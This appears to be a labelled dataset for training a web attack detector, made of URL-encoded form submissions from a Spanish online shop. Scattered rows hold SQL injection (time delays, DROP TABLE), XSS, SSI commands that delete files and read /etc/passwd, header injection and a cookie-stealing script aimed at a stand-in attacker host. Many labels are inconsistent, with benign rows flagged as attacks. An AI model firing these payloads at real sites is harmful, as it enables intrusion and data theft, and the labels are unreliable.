payload,attack_type,label
modo=registro&loginA=zalman&password=*diet%E9tico&nombre=Adiel&apellidos=Fabr%E9s+Bueso&email=riegert_tao-lin%40sanchezquesada.ke&dni=11051114M&direccion=Avenida+San+Mames%2C+25%2C+&ciudad=Carriches&cp=50366&provincia=Guadalajara&ntc=7998962855410697&B1=Registrar,cmdi,1
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=kannel&password=1je5re1&nombre=Ulpiano&apellidos=Lizana+Rom%E0&email=dennen_christlein%40tantra-gay.sn&dni=32806661J&direccion=Plaza+Esquivias%2C+68%2C+5%3FG&ciudad=Jalance&cp=17470&provincia=M%E1laga&ntc=0902736891037031&B1=Registrar,normal,0
modo=registro&loginA=sainsbur&password=aUsTridA&nombre=Deifilia&apellidos=Benedetti+Lozana&email=haddrick_cleary%40esposa.com.mobi&dni=80061275T&direccion=Plza.+Garcia+Alvarez+De+Albornoz%2C+146+&ciudad=Alc%E1zares%2C+Los&cp=41540&provincia=Tarragona&ntc=0932460116452279&B1=Registrar,cmdi,1
modo=registro&login=eldin&password=B9r4enillO&nombre=Rogelio&apellidos=Ingla+Gu-ti%E9r-_rez&email=rehkopf_sell%40zarahealth.cy&dni=31415477F&direccion=C%2F+El+Greco+98%2C+&ciudad=Ll%EDria&cp=34259&provincia=Toledo&ntc=1530250570237050&B1=Registrar,cmdi,1
B2=Vaciar+carrito,normal,0
id=1,normal,0
modo=registro&login=pallen&password=b%2Brigola&nombre=Ronen&apellidos=Albiol&email=pettingell%40psychominders.md&dni=27047841W&direccion=Plaza+Del+Yunque%2C+4%2C+&ciudad=Zarrat%F3n&cp=37766&provincia=Palencia&ntc=0650065659557709&B1=Registrar123,normal,0
b2=vaciar+carrito,normal,0
ID=1BOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG,xss,1
modo=registro&login=toulson&password=79p2lis25&nombre=Maila&apellidos=Ciezar&email=dafydd%40mytanga.nf&dni=41724359J&direccion=C%2F+Santa+Clara+126%2C+6%3FE&ciudad=Onzonilla&cp=19461&provincia=Ourense&ntc=1957012493079149&B1=Registrar,normal,0
B2=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
idA=2,normal,1
modoA=insertar&precio=1408&B1=Confirmar,cmdi,1
B2A=Vaciar+carrito,normal,1
errorMsg=Credenciales+incorrectas,normal,0
id=2,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=3&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=jaki&password=ara%F1erO&nombre=Estanislao&apellidos=Clara&email=mullen%40menorca.com.bf&dni=30591115B&direccion=Padre+Lojendio+53+11%3FC&ciudad=Duesaig%FCes&cp=40171&provincia=C%E1ceres&ntc=7693499164739124&B1=Registrar123,normal,0
B2=Vaciar+carrito%4040123,normal,1
MODO=REGISTRO&LOGIN=BRIARD&PASSWORD=UR7ANISMO&NOMBRE=vITALBOB%40%3cscrIPT%3eALERT%28pAROS%29%3c%2fSCRipt%3e.PAROSPROXY.ORG&APELLIDOS=bONAFINA+cANSINO&EMAIL=GAYOU%40TRANSPORTESVEGASL.BM&DNI=65630152c&DIRECCION=c%2f+mARQUES+dE+lEMA+188+13g&CIUDAD=rUEDA+DE+jAL%f3N&CP=03510&PROVINCIA=lE%f3N&NTC=7816475254908142&b1=rEGISTRAR,xss,1
B2A=Vaciar+carrito123,normal,1
modo=registro&login=mckenney&password=estantalar&nombre=Fulgencia&apellidos=Poma+Gozalbo&email=loti%40ajuntamentbarcelona2-0.is&dni=21924971Z&direccion=C%2F+Huertas+Altas%2C+114+&ciudad=Sequera+de+Haza%2C+La&cp=25260&provincia=Badajoz&ntc=8755728520539974&B1=Registrar123,normal,0
errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
id=1&nombre=Vino+Rioja&precio=85&cantidad=34&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=tomaszew&password=capillero&nombre=Robustiana&apellidos=Sabater+Esp%EDndola&email=fassbin%40der-thordsen6%40professionalhost.as&dni=33035723H&direccion=C%2F+Transportes+70+&ciudad=B%E1rboles&cp=45517&provincia=Palencia&ntc=6125129848113122&B1=Registrar,cmdi,1
id=1,normal,0
modo=registro&login=darpa8&password=pa7em7&nombre=Crispino&apellidos=Leon&email=dymon%40cursosenlaplaya.lk&dni=70312987D&direccion=Calamar%2C+S%2FN+10%3FH&ciudad=PalomeroAND+1%3D1&cp=26312&provincia=%C1lava&ntc=2847781311275477&B1=Registrar,cmdi,1
errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=registro&login=dodds&password=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Jaled&apellidos=Lizancos&email=fong%40zarahealth.bh&dni=22640068H&direccion=Bolivia%2C+130%2C+&ciudad=Alcubilla+de+las+Pe%F1as&cp=47130&provincia=Salamanca&ntc=4180753654421138&B1=Registrar123,sqli,1
id=3&nombre=Queso+Manchego&precio=85&cantidad=51&B1=A%F1adir+al+carrito,normal,0
idA=1123,normal,1
id=1%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=47&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&password=pirr7n108&nombre=Siro&apellidos=Casaramon+Tetatzin&email=malcolm_motaung%40enlanzarote.com.yu&dni=30635705G&direccion=Cristo+Rey%2C+59%2C+2B&ciudad=Arenales+de+San+Gregorio&cp=24745&provincia=Huelva&ntc=2796424278292099&B1=Registrar123,sqli,1
MODO=REGISTRO&LOGIN=YINGCDI&PASSWORD=PISA-VERDE&NOMBRE=vIANELLA&APELLIDOS=gALDEANO+pICCECH&EMAIL=DUDGEON%40TRADORA.NA&DNI=80818838n&DIRECCION=%3c%21--%23exec+CMD%3d%22LS+%2f%22--%3e&CIUDAD=gORMAZ&CP=32737&PROVINCIA=zARAGOZA&NTC=0673547824413217&b1=rEGISTRAR,sqli,1
modo=entrar&login=havis&pwd=7A2A6T1RO&remember=on&B1=Entrar,normal,0
modo=entrar&login=lutz&pwd=OpimA&remember=off%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=Entrar123,sqli,1
B2A=Vaciar+carrito,normal,1
modo=entrar&login=maskell&pwd=mataronesa&remember=on&B1=Entrar,normal,0
B2=Vaciar+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E123,xss,1
errorMsg=Credenciales+incorrectas,normal,0
id=any%250aset-cookie%253a%2btamper%253d1041264011025374727,normal,1
modo=insertar%7C&precio=5930&B1=Pasar+por+caja,cmdi,1
modo=insertar&precio=4110&B1A=Confirmar,cmdi,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=15&B1=A%F1adir+al+carrito,normal,0
errorMsg=Credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,sqli,1
modo=registro&login=iorgo&password=c0l0o4a&nombre=mae&apellidos=ben%edtez+monill&email=mouchet%40007tv.fj&dni=50159319e&direccion=antonio+toledano%2c+78%2c+10%3fh&ciudad=roelos+de+sayago&cp=49167&provincia=le%f3n&ntc=1693717556836495&b1=registrar,normal,0
B2=Vaciar+carrito,normal,0
id=3&nombre=Queso+Manchego&precio=100&cantidad=87&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=wendt&password=entregadora&nombre=natal%edn&apellidos=quiles&email=thiele%40edifico.kp&dni=95866747x&direccion=plaza+museo%2c+45%2c+6e&ciudad=benavente&cp=31253&provincia=le%f3n&ntc=0437949521333484&b1=registrar,normal,0
modo=entrar&login=georges&pwd=CebuANo&remember=off&B1=Entrar,normal,0
errorMsg=Credenciales+incorrectasAND+1%3D1123,normal,1
modo=registro&login=anurag&password=am60A4i7o&nombre=Custodio&apellidos=Amazarray+Gersol&email=martell%40923.pe&dni=15138092K&direccion=Sant+Josep%2C+93%2C+&ciudad=Castellar+del+Vall%E8s&cp=03813&provincia=Soria%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&ntc=2906865498291139&B1=Registrar123,sqli,1
B2=Vaciar+carrito,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
B2=Vaciar+carrito123,normal,0
modo=%27OR%27a%3D%27a&login=hurwitz&password=P7rdUlarIo&nombre=Yasmila&apellidos=Raquer+De+la+Poza&email=kober%40sindns.ve&dni=24117332S&direccion=Calle+Barri+Trinitat+Nova%2C+S%2FN%2C+13D&ciudad=Parra+de+las+Vegas%2C+La&cp=12709&provincia=Le%F3n&ntc=1828745224462815&B1=Registrar,cmdi,1
modo=registro&login=ninon&password=alcahazar&nombre=nazareno&apellidos=satorras+maynol&email=boskova_busey%40piensoparaperros.qa&dni=94505880f&direccion=carrer+rusc+29+&ciudad=benegiles&cp=05212&provincia=%c1vila&ntc=1281450288895094&b1=registrar,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&login=renato&password=DID%E1CtiCaMente&nombre=Favio&apellidos=Gilabert&email=frisco_tretow%40citiway.ec&dni=79332852X&direccion=Calle+Los+Perez+117%2C+&ciudad=Aguasal&cp=15881&provincia=Badajoz&ntc=5960331754539682&B1=Registrar%2520,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar&precio=8328&B1=Pasar+por+caja,normal,0
id=2,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
modo=registro&login=wonuk&password=pulverizador%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&nombre=Mahoma&apellidos=Alorda+Goicoechea&email=fenn%40ticketsport.nu&dni=08512419G&direccion=Calle+Amanecer+105+&ciudad=Fuente+de+San+Esteban%2C+La&cp=16611&provincia=Huelva&ntc=9776865441504888&B1=Registrar,sqli,1
id=1+123,normal,1
errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E123,sqli,1
id=2,normal,0
id=1&nombre=Queso+Manchego&precio=100%2F&cantidad=89&B1=A%F1adir+al+carrito,cmdi,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=24&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=subraman&password=rectificadora&nombre=Nehem%EDas&apellidos=Rogers&email=law%40ankawaelda.au&dni=13570261P&direccion=o+Riomao+36%2C+8%3FF&ciudadA=Villar+de+Peralonso&cp=13429&provincia=M%E1laga&ntc=5016740108170299&B1=Registrar,cmdi,1
modo=insertar&precio=1216&B1=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,cmdi,1
modo=registro&login=terri&password=h9drog4%E10i9a&nombre=Felicitas&apellidos=Olascoaga+Huix&email=brasfield%40elcarritodelacompra.hk&dni=97817650F&direccion=Calle+Tarragona%2C+185+11G&ciudad=Allariz&cp=37219&provincia=Teruel&ntc=9543684554655455&B1=Registrar,normal,0
modo=registro&login=o.sulliv&password=aparencia&nombre=Nahuel&apellidos=Casanellas+Berlingery&email=whorf.laporte%40sindualidad.fo&dni=92086641T&direccion=C%2F+Florida%2C+61+4%3FC&ciudad=Priaranza+del+Bierzo&cp=25136&provincia=Madrid&ntc=0294331048003243&B1=Registrar,normal,0
id=3&nombre=Queso+Manchego&precio=85&cantidad=38&B1=A%F1adir+al+carrito,normal,0
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=75&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=raha&password=de5pi6ar4za4&nombre=Helano&apellidos=Sagu%E9+C%F3nstenla&email=santaniello_tabernero%40enfuerteventura.com.ni&dni=20847295A&direccion=Plaza+Asociacion+De+La+Prensa+107+&ciudad=Segura+de+los+Ba%F1os&cp=14140&provincia=Lleida&ntc=6905236399041419&B1=Registrar,normal,0
modo=registro&login=antonin&password=sUpLiDora&nombre=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&apellidos=Giorgis+Zabala&email=merry%40mcrspain.gg&dni=23625046K&direccion=Pla%E7a+Manuel+Corachan+S%2FN%2C+9A&ciudad=Coscurita&cp=08696&provincia=Lleida&ntc=1573270411029963&B1=Registrar,cmdi,1
modo=insertar&precio=9006&b1=confirmar,normal,0
modo=insertar&precio=1364&B1=Pasar+por+caja,normal,0
modo=registro&login=bret3&password=co01&nombre=Celio&apellidos=Ikediek+Torrades&email=gierasch.casini%40goovitae.cu&dni=12395217B&direccion=Passeig+Bosc%2C+157+&ciudad=Cabredo&cp=13107&provincia=Salamanca&ntc=8230522127552712&B1=Registrar,normal,0
MODO=ENTRAR&LOGIN=CHIHCHIE%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&PWD=UNICIDAD&REMEMBER=OFF&b1=eNTRAR,sqli,1
B2=Vaciar+carrito,normal,0
modo=registro&login=schnirer&password=tornagu%EDa&nombre=Demetrio&apellidos=Caca+Ihnen&email=hampton-bourne%40soyandaluz.lv&dni=25960678A&direccion=C%2F+Antonia+Lancha%2C+38%2C+1%3FH&ciudad=Fontihoyuelo&cp=08261&provincia=Segovia&ntc=3154062648505137&B1=Registrar,normal,0
id=2%2F&nombre=Vino+Rioja&precio=39&cantidad=66&B1=A%F1adir+al+carrito,cmdi,1
id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E123,sqli,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=maridel&password=der85nie88&nombre=Jamil&apellidos=Daya+Basulto&email=fernan-gomez%40juegosgratisinternet.sj&dni=09220629K&direccion=Ciri%2C+23%2C+5%3FA&ciudad=Tierga&cp=04740&provincia=Zamora&ntc=2663409898988215&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=corissa&password=cipresino&nombre=Cenobio&apellidos=La+Ringa+Chinchilla&email=plate%40pecher.mx&dni=16052504E&direccion=Torres+Quevedo%2C+143+10%3FB&ciudad=Casas+de+Juan+N%FA%F1ez&cp=31480&provincia=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&ntc=1974630082144363&B1=Registrar123,xss,1
modo=insertar&precio=6014&B1=Pasar+por+caja123,normal,0
B2=Vaciar+carrito,normal,0
id=2,normal,0
B2A=Vaciar+carrito,normal,1
errorMsg=Credenciales+incorrectas,normal,0
B2=Vaciar+carrito,normal,0
idA=2,normal,1
id=2,normal,0
modo=registro&login=steene&password=h3millos6&nombre=Monserrat&apellidos=Barber%ED&email=nachum%40enmenorca.com.ma&dni=50805644R&direccion=Calle+Due%F1as%2C+60%2C+&ciudad=Medrano%4040&cp=22439&provincia=Zaragoza&ntc=6147677145944254&B1=Registrar,cmdi,1
modo=entrar&login=drissel&pwd=983taU027IV1&remember=on&B1=Entrar123,normal,0
modo=registro&login=dougall&password=bisonte&nombre=olalia&apellidos=molas+madan&email=landesman%40cohel.mw&dni=95690740e&direccion=sargento+luna%2c+184+&ciudad=villagalijo&cp=22571&provincia=girona&ntc=9687551942893066&b1=registrar,normal,0
modo=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&login=elsa&pwd=permanecer&remember=off&B1=Entrar,cmdi,1
modo=registro&login=kilbank&password=a3Rovechada&nombre=Iolaf&apellidos=Oficial+Ribe&email=stinton%40sms24h.dk&dni=18178277C&direccion=Travesia+Hospitalet+De+Llobregat%2C+162+13B&ciudad=Seb%FAlcor&cp=22311&provincia=La+Rioja&ntc=2708595320895470&B1=Registrar,normal,0
ID=3&NOMBRE=vINO+rIOJA&PRECIO=85&CANTIDAD=80%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e&b1=a%f1ADIR+AL+CARRITO,xss,1
id=1,normal,0
modo=registro&login=basco&password=sopista&nombre=Rory&apellidos=Aimar+Taulats&email=cotts%40normatic-vending.gn&dni=71997567T&direccion=C%2F+Salvador+64%2C+5C&ciudad=Quintanilla+de+Urz&cp=49145&provincia=Salamanca&ntc=5714357879809256&B1=Registrar,normal,0
modo=entrar&login=kareem&pwd=lug5r&remember=on&b1=entrar,normal,0
B2=Vaciar+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,sqli,1
modo=registro&login=france&password=capAraz0nsessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&nombre=Reeve&apellidos=Aca+Isach&email=miravalles_kaa%40castigadas.tm&dni=94863540V&direccion=Calle+368+35+&ciudad=Villahoz&cp=45571&provincia=Segovia&ntc=3908296884396301&B1=Registrar,cmdi,1
id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=32&B1=A%F1adir+al+carrito,cmdi,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=21&B1=A%F1adir+al+carrito,normal,0
b2=%3cscript%3eALERT%28%22pAROS%22%29%3b%3c%2fscript%3e,xss,1
modo=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&login=crowder&pwd=6.en0e6at2da&remember=on&B1=Entrar123,sqli,1
B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
errorMsgA=Credenciales+incorrectas,normal,1
modo=registro&login=keen&password=583no&nombre=Cibeles&apellidos=Raja+Villalba&email=backes%40kimkardashian.com.lk&dni=86064216X&direccion=Amann+132+&ciudad=Garrafe+de+Tor%EDo&cp=49167&provincia=Valladolid&ntc=1894425536151221&B1=Registrar,normal,0
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=12&B1=A%F1adir+al+carrito,normal,0
id=2,normal,0
id=2,normal,0
modo=entrar&login=hanneke&pwd=dESHILadIZ&remember=%7C&B1=Entrar,cmdi,1
modo=registro&login=perlmutt&password=alpatana&nombre=Tiquio&apellidos=Mora+Basas&email=barreto.cassagna%40eyewear.nom.ro&dni=39663232P&direccion=Melilla%2C+27+1-G&ciudad=Sard%F3n+de+Duero&cp=44580&provincia=Huelva&ntcA=3967507613982177&B1=Registrar,cmdi,1
modo=insertar&precio=5400&B1=Pasar+por+caja123,normal,0
modo=registro&login=younger&password=35m4c8co&nombre=Karel&apellidos=Villa+Echeverri&email=frankfather%40andrestabernero.dj&dni=54508517N&direccion=Calle+Jose+Canovas+Pujante%2C+106+8G&ciudad=Castell%F3+de+Farfanya&cp=50108&provincia=Navarra&ntc=4761077405436088&B1=Registrar123,normal,0
id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,sqli,1
B2=Vaciar+carrito123,normal,0
B2=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E123,sqli,1
id=1&nombre=Queso+Manchego&precio=85&cantidad=25&B1A=A%F1adir+al+carrito,cmdi,1
idA=1,normal,1
modo=entrar&login=glazer&pwd=rustir&remember=on&B1=Entrar123,normal,0
modo=registro&login=maybelle9&password=5osan%249a&nombre=Juli%E1n&apellidos=Otalora+Fortiana&email=lora%40rocofer.jobs&dni=14962243F&direccion=Avda.+General+Elizaicin+64+5-D&ciudad=Ribamont%E1n+al+Mar&cp=06001&provincia=Zaragoza&ntc=3074429999083032&B1=Registrar,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
modo=entrar&login=firat6&pwd=f4lf7&remember=on&b1=entrar,normal,0
id=2&nombre=Queso+Manchego&precio=100&cantidad=29&B1=A%F1adir+al+carrito%252B,cmdi,1
errorMsg=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=entrar&login=jalaie&pwd=%E1*R6T58A&remember=on&B1=Entrar123,normal,0
modo=insertar&precio=8012&b1=confirmar,normal,0
modo=entrar&login=leonard&pwd=escasamente&remember=off&B1=Entrar123,normal,0
MODO=ENTRAR&LOGIN=VIVIER&PWD=59NI87&REMEMBER=OFF&b1=eNTRAR%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e,xss,1
id=1&nombre=vino+rioja&precio=100&cantidad=43&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=nerti&password=mal3it6&nombre=Osm%E1n&apellidos=Aguinaga+Achutegui&email=kjer%40multibuscador.com.ph&dni=55000265C&direccion=C%2F+Casta%F1os+55+6-G&ciudad=Gomecello&cp=17488&provincia=Lleida&ntc=0952684753761589&B1=Registrar123,normal,0
errorMsgA=Credenciales+incorrectas123,normal,1
modo=insertar&precio=1006&B1=Confirmar,normal,0
modo=entrar&login=ornelas&pwd=frail%EDa&remember=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Entrar,cmdi,1
modo=%2B&login=wing-man7&pwd=edific9r&remember=on&B1=Entrar,cmdi,1
modo=entrar&login=viswa&pwd=0sc9d25.2&remember=on%2F&B1=Entrar,cmdi,1
b2a=vaciar+carrito,normal,1
idA=2,normal,1
id=1&nombreA=Vino+Rioja&precio=39&cantidad=19&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar&precio=9285&b1=pasar+por+caja,normal,0
modo=insertar&precio=4639&B1=Confirmar%2F,cmdi,1
MODO=REGISTRO&LOGIN=ARCO&PASSWORD=SAXOSA&NOMBRE=c%e9SAR&APELLIDOS=nOSSA+vIZCARRONDO&EMAIL=KUNZER.GIORGELLI%40COCHESAUTOMATICOS.KN&DNI=64841759k&DIRECCION=cALLE+hIGUERAS%2c+37+&CIUDAD=uNI%f3N+DE+cAMPOS%2c+lA&CP=20130&PROVINCIA=sEGOVIA&NTC=1690304707007095&b1=%27%3b+drop+table+USUARIOS%3b+select+*+from+DATOS+where+NOMBRE+like+%27%25,sqli,1
id=2&nombre=Vino+Rioja&precio=100%2B&cantidad=32&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar&precio=1784&B1=Confirmar%2F,cmdi,1
id=1&nombre=Vino+Rioja&precio=100&cantidad=64&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=boothe&password=inusitado&nombre=odelia&apellidos=de+la+barca+pitti&email=dierking3%40carmensanmartin.kn&dni=69557398q&direccion=diaz+camacho+107%2c+2-a&ciudad=sant+esteve+de+la+sarga&cp=40184&provincia=segovia&ntc=9636562879352994&b1=registrar,normal,0
modo=entrar&login=whey-min&pwd=r.apaz&rememberA=off&B1=Entrar,cmdi,1
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=mirabell&password=implIcaNte%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Yayn&apellidos=Boliart+Jubert&email=karlatos-woodcroft%40joyaseleccion.fr&dni=90456703A&direccion=Avenida+Vigo+194+&ciudad=Olula+de+Castro&cp=07195&provincia=Cuenca&ntc=6879168763922210&B1=Registrar,sqli,1
id=3&nombre=Queso+Manchego&precio=39&cantidad=%2520&B1=A%F1adir+al+carrito,cmdi,1
B2=Vaciar+carrito,normal,0
id=2123,normal,0
errormsga=credenciales+incorrectas,normal,1
id=2&nombreA=Vino+Rioja&precio=85&cantidad=54&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar%2520&login=shirai&pwd=3897r%24314m78t8&remember=off&B1=Entrar,cmdi,1
id=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
b2=vaciar+carrito,normal,0
modo=entrar&login=trahan&pwd=72513662r719&remember=on%2F&B1=Entrar,cmdi,1
modo=insertar&precio=3151&B1=Pasar+por+caja,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=kunecke&password=zendo&nombre=Venancia&apellidos=Cohen+Encabo&email=matsuda.agay%40estaestuweb.com.bu&dni=50248210H&direccion=Calle+Molin+El+Toro+28%2C+&ciudad=Arcos&cp=07150&provincia=Le%F3n&ntc=7418312492112403&B1=Registrar123,normal,0
ida=2,normal,1
id=3&nombre=Vino+Rioja&precio=39&cantidadA=34&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=marylin&pwd=mantenci%f3n&remember=off&b1=entrar,normal,0
modo=insertar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&precio=3845&B1=Pasar+por+caja,sqli,1
ID=%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
modoA=entrar&login=melfi&pwd=espesamente&remember=on&B1=Entrar,cmdi,1
modo=entrar&login=flicking&pwd=abondadamente&remember=on&B1=Entrar123,normal,0
MODO=REGISTRO&LOGIN=HARTMANN&PASSWORD=AL55NZA&NOMBRE=rANDOLFO&APELLIDOS=rOVIROLA+nOIRAN&EMAIL=SEMMELROGGE%40SPAINPHARMA.ZM&DNI=73500117yBOB%40%3cscrIPT%3eALERT%28pAROS%29%3c%2fSCRipt%3e.PAROSPROXY.ORG&DIRECCION=pL.+aRANJUEZ%2c+s%2fn+&CIUDAD=sOBREMUNT&CP=18127&PROVINCIA=tARRAGONA&NTC=1198702099336688&b1=rEGISTRAR,xss,1
modo=registro&login=antonin&password=sUpLiDora&nombre=Calixto&apellidos=Giorgis+Zabala&email=merry%40mcrspain.gg&dni=23625046K&direccion=Pla%E7a+Manuel+Corachan+S%2FN%2C+9A&ciudad=Coscurita&cp=08696paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&provincia=Lleida&ntc=1573270411029963&B1=Registrar,xss,1
modo=registro&login=tappert5&password=a627o07ta&nombre=Romildo&apellidos=Russell+Barrio&emailA=guilfoyle%40santacruzdelvoto.tl&dni=40052504M&direccion=Calle+Del+Litio+143%2C+&ciudad=Unciti&cp=18565&provincia=Zamora&ntc=8140611124305673&B1=Registrar,cmdi,1
modo=insertar&precio=8459&B1A=Confirmar,cmdi,1
id=3&nombre=Queso+Manchego&precio=85&cantidad=51&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=perl&password=c742na79&nombre=Claudiano&apellidos=Retamal&email=vai%40sexplorador.mk&dni=67312081M&direccion=Plza.+Beat+Andreu+Hibernon+S%2FN+12C&ciudad=Massanes&cp=25613&provincia=Badajoz&ntc=6905166660575167&B1=Registrar,normal,0
modo=insertar&precio=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Confirmar,sqli,1
modo=entrar&login=p%2Bap*e&pwd=74oNc0&remember=on&B1=Entrar,cmdi,1
errorMsg=Credenciales+incorrectas123,normal,0
errormsg=credenciales+incorrectas,normal,0
id=1,normal,0
modo=registro&login=sultan&password=sOLLar&nombre=Heber&apellidos=Patr%F3n&emailA=fonseke_cicco%40ropadegolf.com.fj&dni=72983438E&direccion=Calle+Azofra+28+&ciudad=Baraona&cp=28694&provincia=Lleida&ntc=5423616197210085&B1=Registrar,cmdi,1
modo=insertar&precio=4135&B1=Confirmar%2F,cmdi,1
